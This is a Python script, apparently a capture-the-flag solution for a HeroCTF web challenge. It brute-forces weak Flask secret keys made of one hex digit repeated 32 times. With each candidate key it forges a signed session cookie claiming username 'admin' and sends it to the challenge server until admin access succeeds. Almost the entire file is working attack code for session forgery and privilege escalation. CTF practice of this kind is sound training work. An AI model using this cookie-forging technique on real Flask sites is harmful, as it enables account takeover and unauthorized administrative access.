from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
from string import hexdigits
import requests

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    # Override method
    # Take secret_key instead of an instance of a Flask app
    def get_signing_serializer(self, secret_key):
        if not secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )
        return URLSafeTimedSerializer(secret_key, salt=self.salt,
                                      serializer=self.serializer,
                                      signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.dumps(cookieDict)

if __name__=='__main__':
  #for c in hexdigits:
  url = "https://smallbigmistake.web.heroctf.fr/"
  for c in hexdigits:
    sk = str(c)*32
    #in ra sk tu 0123456789abcdeABCDE tu hexdigits dai 32 ki tu
    print(sk)

    sessionDict = {u'username':'admin'}

    #encode
    cookie = encodeFlaskCookie(sk, sessionDict)
    print(cookie)
    
    #gui rq len url voi cookies da encode
    req = requests.get(url, cookies={"session":cookie})

    #in ra ki tu hexdigits hien tai
    print(c)

    #neu dung!
    if "You are not admin !" not in req.text:
      print(req.text)
      break

    #decode lai
    decodedDict = decodeFlaskCookie(sk, cookie)
    print(decodedDict)

    #true or false
    print(sessionDict==decodedDict)